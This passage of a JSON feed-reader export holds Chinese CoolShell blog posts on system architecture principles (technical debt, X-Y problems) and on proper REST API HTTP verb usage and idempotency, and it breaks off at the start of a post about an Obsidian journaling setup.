解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……</strong>”，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。</p>\n<p>他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……</p>\n<p>我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《<a href=\"https://coolshell.cn/articles/11656.html\" target=\"_blank\" rel=\"noopener\">开发团队的效率</a>》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）</p>\n<p>这里有几个原则和方法我是非常坚持的，分享给大家：</p>\n<ul>\n<li><strong>与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。</strong></li>\n<li><strong>建设没有技术债的“新城区”，并通过“<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer\" target=\"_blank\" rel=\"noopener\">防腐层</a> ”的架构模型，不要让技术债侵入“新城区”</strong>。</li>\n</ul>\n<h4>原则九：不要依赖自己的经验，要依赖于数据和学习</h4>\n<p>有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade-off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……</p>\n<p>另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。</p>\n<h4>原则十：千万要小心 X – Y 问题，要追问原始需求</h4>\n<p>对于 <a title=\"X-Y Problem\" href=\"https://coolshell.cn/articles/10804.html\">X-Y 问题</a>，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。</p>\n<p>比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。</p>\n<p>我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……</p>\n<h4>原则十一：激进胜于保守，创新与实用并不冲突</h4>\n<p>我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《<a title=\"Go语言、Docker 和新技术\" href=\"https://coolshell.cn/articles/18190.html\" target=\"_blank\" rel=\"noopener\">Go,Docker 和新技术</a> 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。</p>\n<p>有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。</p>\n<p>这里的逻辑很简单 —— <strong>进步永远来自于探索，探索是要付出代价的，但是收益更大</strong>。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……</p>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/18024.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg\" alt=\"API设计原则 – Qt官网的设计实践总结\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/18024.html\">API设计原则 – Qt官网的设计实践总结</a></li><li><a href=\"https://coolshell.cn/articles/17680.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/02/gitlab-600-150x150.jpg\" alt=\"从Gitlab误删除数据库想到的\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/17680.html\">从Gitlab误删除数据库想到的</a></li><li><a href=\"https://coolshell.cn/articles/17459.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2016/08/HighAvailability-BK-150x150.png\" alt=\"关于高可用的系统\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/17459.html\">关于高可用的系统</a></li><li><a href=\"https://coolshell.cn/articles/9949.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg\" alt=\"IoC/DIP其实是一种管理思想\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/9949.html\">IoC/DIP其实是一种管理思想</a></li><li><a href=\"https://coolshell.cn/articles/6775.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"Bret Victor – Inventing on Principle\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/6775.html\">Bret Victor – Inventing on Principle</a></li><li><a href=\"https://coolshell.cn/articles/5686.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg\" alt=\"多些时间能少写些代码\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/5686.html\">多些时间能少写些代码</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21672.html\">我做系统架构的一些原则</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=22173",
    "timestampUsec": "1657644531898536",
    "categories": [
        "技术新闻",
        "程序设计",
        "HTTP",
        "Programmer",
        "Restful",
        "程序员",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "“一把梭：REST API 全用 POST”",
    "author": ";陈皓",
    "published": 1644726480,
    "updated": 1644726480,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/22173.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-300x169.png\" alt=\"\" width=\"325\" height=\"183\"></p>\n<p>写这篇文章的原因主要还是因为V2EX上的这个<a href=\"https://www.v2ex.com/t/830030?p=1\" target=\"_blank\" rel=\"noopener\">贴子</a>，这个贴子中说——</p>\n<blockquote><p>“对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更安全，之前习惯使用 restful api ，如果说 https 只有 post 请求是安全的话？那为啥还需要 get 、put 、delete ？我该如何反驳他。”</p></blockquote>\n<p>然后该贴中大量的回复大概有这么几种论调，1）POST挺好的，就应该这么干，沟通少，2）一把梭，早点干完早点回家，3）吵赢了又怎么样？工作而已，优雅不能当饭吃。虽然评论没有一边倒，但是也有大量的人支持。然后，我在Twitter上嘲讽了一下，用POST干一切就像看到了来你家装修工人说，“老子干活就是用钉子钉一切，什么螺丝、螺栓、卡扣、插销……通通不用，钉枪一把梭，方便，快捷，安全，干完早回家……不过，还是有一些网友觉得用POST挺好的，而且可以节约时间。所以，正好，我在《<a title=\"我做系统架构的一些原则\" href=\"https://coolshell.cn/articles/21672.html\" target=\"_blank\" rel=\"noopener\">我做系统架构的原则</a>》中的“<a href=\"https://coolshell.cn/articles/21672.html#%E5%8E%9F%E5%88%99%E4%BA%94%EF%BC%9A%E5%88%B6%E5%AE%9A%E5%B9%B6%E9%81%B5%E5%BE%AA%E6%9C%8D%E4%BB%8E%E6%A0%87%E5%87%86%E3%80%81%E8%A7%84%E8%8C%83%E5%92%8C%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5\" target=\"_blank\" rel=\"noopener\">原则五</a>”中反对API返回码无论对错全是200的返回那，我专门写下这一篇文章，以正视听。</p>\n<p>这篇文章主要分成下面这几个部分：</p>\n<ol>\n<li>为什么要用不同的HTTP动词？</li>\n<li>Restful 进行复杂查询</li>\n<li>几个主要问题的回应\n<ul>\n<li>POST 更安全吗？</li>\n<li>全用 POST 可以节省时间沟通少吗？</li>\n<li>早点回家的正确姿势</li>\n<li>工作而已，优雅不能当饭吃</li>\n</ul>\n</li>\n</ol>\n<p><span></span></p>\n<h4>为什么要用不同的HTTP动词</h4>\n<p>编程世界通常来说有两种逻辑：“<strong>业务逻辑</strong>” 和 “<strong>控制逻辑</strong>”。</p>\n<ul>\n<li><strong>业务逻辑</strong>。就是你实现业务需求的功能的代码，就是跟用户需求强相关的代码。比如，把用户提交的数据保存起来，查询用户的数据，完成一个订单交易，为用户退款……等等，这些是业务逻辑</li>\n<li><strong>控制逻辑</strong>。就是我们用于控制程序运行的非功能性的代码。比如，用于控制程序循环的变量和条件，使用多线程或分布式的技术，使用HTTP/TCP协议，使用什么样数据库，什么样的中间件……等等，这些跟用户需求完全没关系的东西。</li>\n</ul>\n<p>网络协议也是一样的，一般来说，<strong>几乎所有的主流网络协议都有两个部分，一个是协议头，一个是协议体。协议头中是协议自己要用的数据，协议体才是用户的数据。所以，协议头主要是用于协议的控制逻辑，而协议体则是业务逻辑。</strong></p>\n<p>HTTP的动词（或是Method）是在协议头中，所以，其主要用于控制逻辑。</p>\n<p dir=\"auto\">下面是HTTP的动词规范，一般来说，REST API 需要开发人员严格遵循下面的标准规范（参看<a href=\"https://www.rfc-editor.org/rfc/rfc7231#section-4.2.2\" target=\"_blank\" rel=\"noopener\">RFC7231 章节4.2.2 – Idempotent Methods</a>）</p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n<th>幂等</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GET</td>\n<td>用于查询操作，对应于数据库的 <code>select</code> 操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>用于所有的信息更新，对应于数据库的 <code>update </code>操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎︎</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>用于更新操作，对应于数据库的 <code>delete</code> 操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎︎</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>用于新增操作，对应于数据库的 <code>insert</code> 操作</td>\n<td>✘</td>\n</tr>\n<tr>\n<td>HEAD</td>\n<td>用于返回一个资源对象的“元数据”，或是用于探测API是否健康</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n<tr>\n<td>PATCH</td>\n<td>用于局部信息的更新，对应于数据库的 <code>update</code> 操作</td>\n<td>✘</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>获取API的相关的信息。</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n</tbody>\n</table>\n<p>其中，<code>PUT</code> 和 <code>PACTH</code> 都是更新业务资源信息，如果资源对象不存在则可以新建一个，但他们两者的区别是，<code>PUT</code> 用于更新一个业务对象的所有完整信息，就像是我们通过表单提交所有的数据，而 <code>PACTH</code> 则对更为API化的数据更新操作，只需要更需要更新的字段（参看 <a href=\"http://tools.ietf.org/html/rfc5789\" rel=\"nofollow\">RFC 5789</a> ）。</p>\n<p>当然，现实世界中，可能并不一定严格地按照数据库操作的CRUD来理解API，比如，你有一个登录的API <code>/login</code> 你觉得这个API应该是 <code>GET</code> ，<code>POST</code>，<code>PUT</code> 还是 <code>PATCH</code> ?登录的时候用户需要输入用户名和密码，然后跟数据库里的对比（select操作）后反回一个登录的session token，然后这个token作为用户登录的状态令牌。如果按上面表格来说，应该是 select 操作进行 <code>GET</code> ，但是从语义上来说，登录并不是查询信息，应该是用户状态的更新或是新增操作（新增session），所以还是应该使用 <code>POST</code>，而 <code>/logout</code> 你可以使用 <code>DELETE</code> 。<strong>这里相说明一下，不要机械地通过数据库的CRUD来对应这些动词，很多时候，还是要分析一下业务语义。</strong></p>\n<p><strong>另外，我们注意到，在这个表格的最后一列中加入了“是否幂等”的，API的幂等对于控制逻辑来说是一件很重要的事。</strong>所谓幂等，就是该API执行多次和执行一次的结果是完全一样的，没有副作用。</p>\n<ul>\n<li><code>POST</code> 用于新增加数据，比如，新增一个交易订单，这肯定不能是幂等的</li>\n<li><code>DELETE</code> 用于删除数据，一个数据删除多次和删除一次的结果是一样的，所以，是幂等的</li>\n<li><code>PUT</code> 用于全部数更新，所以，是幂等的。</li>\n<li><code>PATCH</code>用于局部更新，比如，更新某个字段 cnt = cnt+1，明显不可能是幂等操作。</li>\n</ul>\n<p>幂等这个特性对于远程调用是一件非常关键的事，就是说，远程调用有很多时候会因为网络原因导致调用timeout，对于timeout的请求，我们是无法知道服务端是否已经是收到请求并执行了，此时，我们不能贸然重试请求，对于不是幂等的调用来说，这会是灾难性的。比如像转帐这样的业务逻辑，转一次和转多次结果是不一样的，如果重新的话有可能就会多转了一次。所以，这个时候，如果你的API遵从了HTTP动词的规范，那么你写起程序来就可以明白在哪些动词下可以重试，而在哪些动词下不能重试。如果你把所有的API都用POST来表达的话，就完全失控了。</p>\n<p>除了幂等这样的控制逻辑之外，你可能还会有如下的这些控制逻辑的需求：</p>\n<ul>\n<li><strong>缓存</strong>。通过CDN或是网关对API进行缓存，很显然，我们要在查询<code>GET</code> 操作上建议缓存。</li>\n<li><strong>流控</strong>。你可以通过HTTP的动词进行更粒度的流控，比如：限制API的请用频率，在读操作上和写操作上应该是不一样的。</li>\n<li><strong>路由</strong>。比如：写请求路由到写服务上，读请求路由到读服务上。</li>\n<li><strong>权限</strong>。可以获得更细粒度的权限控制和审计。</li>\n<li><strong>监控</strong>。因为不同的方法的API的性能都不一样，所以，可以区分做性能分析。</li>\n<li><strong>压测</strong>。当你需要压力测试API时，如果没有动词的区分的话，我相信你的压力测试很难搞吧。</li>\n<li>……等等</li>\n</ul>\n<p>也许，你会说，我的业务太简单了，没有必要搞这么复杂。OK，没有问题，但<strong>是我觉得你最差的情况下，也是需要做到“读写分离”的，就是说，至少要有两个动词，<code>GET</code> 表示是读操作，<code>POST</code>表示是写操作。</strong></p>\n<h4>Restful 复杂查询</h4>\n<p>一般来说，对于查询类的API，主要就是要完成四种操作：排序，过滤，搜索，分页。下面是一些相关的规范。参考于两个我觉得写的最好的Restful API的规范文档，<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a>。</p>\n<ul dir=\"auto\">\n<li>\n<p dir=\"auto\"><strong>排序</strong>。对于结果集的排序，使用 <code>sort</code> 关键字，以及 <code>{field_name}|{asc|desc},{field_name}|{asc|desc}</code> 的相关语法。比如，某API需要返回公司的列表，并按照某些字段排序，如：<code>GET /admin/companies?sort=rank|asc</code> 或是 <code>GET /admin/companies?sort=rank|asc,zip_code|desc</code></p>\n</li>\n<li>\n<p dir=\"auto\"><strong>过滤</strong>。对于结果集的过滤，使用 <code>filter</code> 关键字，以及 <code>{field_name} op{value}</code> 的语法。比如： <code>GET /companies?category=banking&amp;location=china</code> 。但是，有些时候，我们需要更为灵活的表达式，我们就需要在URL上构造我们的表达式。这里需要定义六个比较操作：<code>=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&lt;=</code>，<code>&gt;=</code>，以及三个逻辑操作：<code>and</code>，<code>or</code>，<code>not</code>。（表达式中的一些特殊字符需要做一定的转义，比如：<code>&gt;=</code> 转成 <code>ge</code>）于是，我们就会有如下的查询表达式：<code>GET /products?$filter=name eq 'Milk' and price lt 2.55</code> 查找所有的价柗小于2.55的牛奶。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>搜索</strong>。对于相关的搜索，使用 <code>search</code> 关键字，以及关键词。如：<code>GET /books/search?description=algorithm</code> 或是直接就是全文搜索 <code>GET /books/search?key=algorithm</code> 。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>分页</strong>。对于结果集进行分页处理，分页必需是一个默认行为，这样不会产生大量的返回数据。</p>\n<ul dir=\"auto\">\n<li>使用<code>page</code>和<code>per_page</code>代表页码和每页数据量，比如：<code>GET /books?page=3&amp;per_page=20</code>。</li>\n<li><strong>可选</strong>。上面提到的<code>page</code>方式为使用相对位置来获取数据，可能会存在两个问题：性能（大数据量）与数据偏差（高频更新）。此时可以使用绝对位置来获取数据：事先记录下当前已获取数据里最后一条数据的<code>ID</code>、<code>时间</code>等信息，以此获取 “<strong>该ID之前的数据</strong>” 或 “<strong>该时刻之前的数据</strong>”。示例：<code>GET /news?max_id=23454345&amp;per_page=20</code> 或 <code>GET /news?published_before=2011-01-01T00:00:00Z&amp;per_page=20</code>。</li>\n</ul>\n</li>\n</ul>\n<p>另外，对于一些更为复杂的操作，建议通过分别调用多个API的方式来完成，虽然这样会增加网络请求的次数，但是这样的可以让后端程序和数据耦合度更小，更容易成为微服务的架构。</p>\n<p>最后，如果你想在Rest中使用像GraphQL那样的查询语言，你可以考虑一下类似 <a href=\"https://www.odata.org/\" target=\"_blank\" rel=\"noopener\">OData</a> 的解决方案。OData 是 Open Data Protocol 的缩写，最初由 Microsoft 于 2007 年开发。它是一种开放协议，使您能够以简单和标准的方式创建和使用可查询和可互操作的 RESTful API。</p>\n<h4>几个主要问题的回应</h4>\n<p>下面是对几个问题的直接回应，如果大家需要我回应更多的问题，可以在后面留言，我会把问题和我的回应添加到下面。</p>\n<h5>1）为什么API 要Restful，并符合规范？</h5>\n<p><strong>Restful API算是一个HTTP的规范和标准了，你要说是最佳实践也好，总之，它是一个全世界对HTTP API的一个共识。在这个共识上，你可以无成本地享受很多的技术红利，比如：CDN，API网关，服务治理，监控……等等。这些都是可以让你大幅度降低研发成本，避免踩坑的原因。</strong></p>\n<h5>2）为什么“过早优化”不适用于API设计？</h5>\n<p>因为API是一种契约，一旦被使用上，就很难再变更了，就算你发行新的版本的API，你还要驱动各种调用方升级他们的调用方式。所以，接口设计就像数据库模式设计一下，一旦设计好了，未来再变更就比较难了。所以，还是要好好设计。正如前面我给的几个文档——<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a> 或是 <a href=\"https://cloud.google.com/apis/design\" target=\"_blank\" rel=\"noopener\">Google API Design Guide</a> 都是让你好好设计API的不错的 Guidelines.</p>\n<h5>3）POST 更安全吗？</h5>\n<p>不会。</p>\n<p>很多同学以为 <code>GET</code> 的请求数据在URL中，而 <code>POST</code> 的则不是，所以以为 <code>POST</code> 更安全。不是这样的，整个请求的HTTP URL PATH会全部封装在HTTP的协议头中。只要是HTTPS，就是安全的。当然，有些网关如nginx会把URL打到日志中，或是会放在浏览器的历史记录中，所以有人会说 <code>GET</code> 请求不安全，但是，<code>POST</code> 也没有好到哪里去，在 <a href=\"https://en.wikipedia.org/wiki/Cross-site_request_forgery\" target=\"_blank\" rel=\"noopener\">CSRF</a> 这个最常见的安全问题上，则完全就是针对 <code>POST</code> 的。  安全是一件很复杂的事，无论你用哪方法或动词都会不能代表你会更安全。</p>\n<p>另外，</p>\n<h5>4）全用 POST 可以节省时间减少沟通吗？</h5>\n<p>不但不会，反而更糟糕。</p>\n<p>说这种话的人，我感觉是不会思考问题。</p>\n<ul>\n<li>其一，为API赋于不同的动词，这个几乎不需要时间。把CRUD写在不同的函数下也是一种很好的编程风格。另外现在几乎所有的开发框架都支持很快速的CRUD的开发，比如Spring Boot，写数据库的CRUD基本上就不需要写SQL语言相关的查询代码，非常之方便。</li>\n<li>其二，使用规范的方式，可以节约新加入团队人员的学习成本，而且可以大大减少跨团队的沟能成本。规范和标准其实就是在节约团队时间提升整体效率的，这个我们整个人类进行协作的基础。所以，这个世界上有很多的标准，你只要照着这个标准来，你的所生产的零件就可以适配到其它厂商的产品上。而不需要相互沟通。</li>\n<li>萁三，全用POST接口一把梭，不规范不标准，使用你的这个山寨API的人就得来不断的问你，反而增加了沟通。另外，也许你开发业务功能很快了，但是你在做控制逻辑的时候，你就要返工了，从长期上来讲，你的欠下了技术债，这个债反而导致了更大的成本。</li>\n</ul>\n<h5>5）早点回家的正确姿势</h5>\n<p>不要以为你回家早就没事了，如果你的代码有这样那样的问题，别人看懂，或是出误用了你的代码出了问题，那么，你早回家有什么意义呢？你一样要被打扰，甚至被叫到公司来处理问题。所以，你应该做的是为了“长期的早回家”，而不是“短期的早回家”，要像长期的早回家，通常来说是这样的：</p>\n<ul>\n<li><strong>把代码组织设计好，有更好的扩展性</strong>。这样在面对新需求的时候，你就可以做到少改代码，甚至不改代码。这样你才可能早回家。不然，每次需求一来，你得重新写，你怎么可能早回家？</li>\n<li><strong>你的代码质量是不错的，有不错的文档和注释</strong>。所以，别人不会老有问题来找你，或是你下班后，叫你来处理问题。甚至任何人都可以很容易地接手你的代码，这样你才可能真正不被打扰</li>\n</ul>\n<h5>6）工作而已，优雅不能当饭吃</h5>\n<p>回应两点：</p>\n<p>其一，遵循个规范而已，把“正常”叫“优雅”，可见标准有多低。这么低的标准也只能“为了吃饭而生存了”。</p>\n<p>其二，<strong>作为一个“职业程序员”，要学会热爱和尊重自己的职业，热爱自己职业最重要的就是不要让外行人看扁这个职业，自己都不尊重这个职业，你让别人怎么尊重？尊重自己的职业，不仅仅只是能够获得让人羡慕的报酬，而更是要让自己的这个职业的更有含金量</strong>。</p>\n<p><strong>希望大家都能尊重自己从事的这个职业，成为真正的职业化的程序员，而不是一个码农！</strong></p>\n<figure aria-describedby=\"caption-attachment-22177\"><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg\" alt=\"\" width=\"834\" height=\"319\"><figcaption>你的工作给你权力，而只有你的行为才会给你尊重</figcaption></figure>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/22157.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg\" alt=\"谈谈公司对员工的监控\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/22157.html\">谈谈公司对员工的监控</a></li><li><a href=\"https://coolshell.cn/articles/21589.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg\" alt=\"如何做一个有质量的技术分享\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21589.html\">如何做一个有质量的技术分享</a></li><li><a href=\"https://coolshell.cn/articles/20977.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png\" alt=\"程序员如何把控自己的职业\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20977.html\">程序员如何把控自己的职业</a></li><li><a href=\"https://coolshell.cn/articles/20765.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg\" alt=\"MegaEase的远程工作文化\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20765.html\">MegaEase的远程工作文化</a></li><li><a href=\"https://coolshell.cn/articles/20276.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg\" alt=\"别让自己“墙”了自己\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20276.html\">别让自己“墙”了自己</a></li><li><a href=\"https://coolshell.cn/articles/19612.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/07/1920px-Margaret_Hamilton_-_restoration-e1563697198766-1-150x150.jpg\" alt=\"50年前的登月程序和程序员有多硬核\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/19612.html\">50年前的登月程序和程序员有多硬核</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22173.html\">“一把梭：REST API 全用 POST”</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://diygod.me/obsidian/",
    "timestampUsec": "1657679071252069",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/label/笔记系统"
    ],
    "title": "基于 Obsidian 的生活记录系统",
    "author": ";DIYgod",
    "published": 1657390980,
    "updated": 1657390980,
    "alternate": [
        {
            "href": "https://diygod.me/obsidian/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>正如我在 <a href=\"https://diygod.me/2020\">2020 年终总结</a> 中提到，我一直在用 Notion 写子弹笔记，现在它有了亿点点不一样，现在我们就来重新窥探一下我目前的生活记录系统</p><p><strong>日记</strong><br><img src=\"https://diygod.me/images/obsidian-1.png\"></p><span></span><p><strong>周记</strong>和<strong>月记</strong><br><img src=\"https://diygod.me/images/obsidian-8.png\"></p><p><strong>年记</strong><br><img src=\"https://diygod.me/images/obsidian-9.png\"></p><p>原 Notion 子弹笔记<br><img src=\"https://diygod.me/images/2020-1.jpg\" width=\"50%\"></p><p>受益于 Obsidian 强大的自动化能力和极高的自由度，日/周/月/年笔记通过预设模板自动生成，互相联动，需要手动处理的部分很少</p><p>全部文件已上传至 GitHub：<a href=\"https://github.com/DIYgod/DIYgod-Obsidian-Starter\">https://github.com/DIYgod/DIYgod-Obsidian-Starter</a>，包括主题、插件、配置文件、自己定制的样式、模板文件、示例文件等，只是作为一个示例，请根据自己实际情况修改</p><p>这些东西乍一看是有一些复杂，但其实用起来很简单，自由度和可扩展性也很强，下面我来详细介绍</p><h2><a href=\"https://diygod.me/#%E7%BB%93%E6%9E%84\" 